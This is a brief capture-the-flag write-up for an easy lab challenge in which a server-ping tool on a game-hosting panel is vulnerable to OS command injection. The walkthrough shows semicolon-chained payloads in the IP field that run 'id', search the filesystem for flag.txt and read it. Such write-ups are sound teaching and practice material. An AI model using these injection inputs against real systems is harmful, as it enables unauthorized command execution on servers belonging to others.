---

Name: GurGamer
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/events/GurGamer
Description: GurGamer started as a couple of friends renting boxes to host their own Minecraft realm and grew into a small hosting shop. The Server Query tool was an early convenience, a quick "is my server up?" button wired straight to the box's own networking utilities back when the panel was internal-only. It has worked the same way ever since, long after the panel opened up to every tenant on the node. 

---

We have a tool which lets us ping our ip
```
10.20.0.11
```

Since it likely uses the ping utility from linux, let's try chaining commands
```
10.20.0.11; id
uid=1100(gurgamer) gid=1100(gurgamer) groups=1100(gurgamer)
```

Now let's search for flag.txt
```
10.20.0.11; find / -name flag.txt 2> /dev/null
/flag.txt
```

And read it
```
10.20.0.11; cat /flag.txt
```
